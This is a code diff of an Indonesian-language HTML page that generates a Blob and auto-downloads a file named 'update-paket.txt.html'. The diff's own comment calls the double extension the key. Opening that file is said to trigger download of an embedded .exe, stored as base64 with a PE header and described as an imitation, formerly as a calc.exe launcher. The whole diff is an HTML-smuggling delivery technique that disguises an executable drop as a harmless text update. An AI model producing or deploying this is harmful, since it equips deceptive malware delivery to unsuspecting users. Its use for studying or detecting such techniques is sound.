@@ -23,7 +23,7 @@ button:hover { background: #b71c1c; }
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk mengunduh satu file HTML ber-ekstensi .txt. Saat dibuka, file tersebut akan memicu download satu file .exe.</p>
+<p>Klik tombol untuk mengunduh satu file HTML ber-ekstensi <code>.txt.html</code>. Saat dibuka, file tersebut akan memicu download satu file .exe.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -75,7 +75,7 @@ const prepareMimeBlobAsync = (i) => {
             "return bytes;" +
             "}" +
             
-            // PAYLOAD: File .exe yang berisi perintah untuk membuka calc.exe
+            // PAYLOAD: File .exe tiruan
             "var b64Data = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4A8AAAAAAAAwAAAAAAAAAAAAAAAAAAAAQAAA\" + " +
             "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
             "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
@@ -130,8 +130,11 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    link.download = `update-paket.txt`; // Hanya satu file, tanpa nomor
-    link.textContent = `Download update-paket.txt`;
+    
+    // KUNCI: Ekstensi ganda .txt.html
+    link.download = `update-paket.txt.html`;
+    
+    link.textContent = `Download update-paket.txt.html`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
     link.click();
@@ -140,7 +143,6 @@ const triggerInstantDownload = (fileData) => {
 startBtn.addEventListener("click", () => {
     if (isProcessing) return;
 
-    // Bersihkan URL lama
     activeUrls.forEach(url => URL.revokeObjectURL(url));
     activeUrls = [];
     downloadsDiv.replaceChildren();
@@ -165,7 +167,6 @@ startBtn.addEventListener("click", () => {
         isProcessing = true;
         speak("Proses pembuatan berkas Blob dimulai.");
         
-        // Hanya jalankan sekali (tanpa loop)
         const fileData = await prepareMimeBlobAsync(1);
         activeUrls.push(fileData.url);
         triggerInstantDownload(fileData);
